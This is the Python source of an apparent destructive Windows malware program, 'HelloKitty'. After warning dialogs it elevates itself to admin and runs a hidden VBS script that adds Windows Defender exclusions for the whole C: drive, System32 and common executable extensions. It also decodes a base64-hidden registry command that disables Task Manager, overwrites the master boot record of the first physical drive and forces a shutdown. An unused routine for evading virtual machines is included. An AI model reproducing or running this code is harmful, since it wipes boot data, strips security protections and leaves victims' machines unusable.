import os
import sys
import platform
if os.name != "nt":
    sys.exit()
if platform.release() != '10':
    sys.exit()
from pathlib import Path
from tkinter import messagebox
import psutil
import time
import base64
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import win32comext.shell.shell as shell
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wadaw.txt"
TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"

def Warning():
    if messagebox.askyesno("HelloKitty", "WARNING: This program is a real virus and will destroy your PC. Are you sure you want to start it?", icon="warning"):
        if messagebox.askyesno("HelloKitty", "LAST-WARNING: Are you really sure you want to start this program? After that there is no turning back!", icon="warning"):
            Installation()

def Installation():
    if not os.path.isfile(DontDownloadPath) == True:
        DTM()

        os.chdir(TempPath)

        text_file = open("val.vbs", "w")

        text_file.write(f'''
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\DWD.exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\WindowsDefender.exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'vbs'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'dll'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows\System32'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath {str(Path.home())}", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Local\Temp'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Roaming'", 0, True
        ''')
        
        text_file.close()

        time.sleep(2)

        os.system("attrib +h " + 'val.vbs')

        os.system("start val.vbs")

        os.system("echo > djj012ndawm10d9wadaw.txt")

        DelMBR()

def AntiVm():
  Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
  for process in psutil.process_iter():
      for i in Process:
        if i in process.name().lower():
            return CommitSuicide()

def CommitSuicide():
  sys.exit()

def DelMBR():
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
    WriteFile(hDevice, AllocateReadBuffer(512), None)
    CloseHandle(hDevice)

    os.system("shutdown -s -f -t 0")

def DTM():
    try:
        base64_message  = "InN0YXJ0IGNtZCAvYyBSRUcgYWRkIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIC92IERpc2FibGVUYXNrTWdyIC90IFJFR19EV09SRCAvZCAxIC9mIg=="
        base64_bytes = base64_message.encode('UTF-8')
        message_bytes = base64.b64decode(base64_bytes)
        code = message_bytes.decode('UTF-8')

        os.system(code)
    except:
        pass

#AntiVm()
Warning()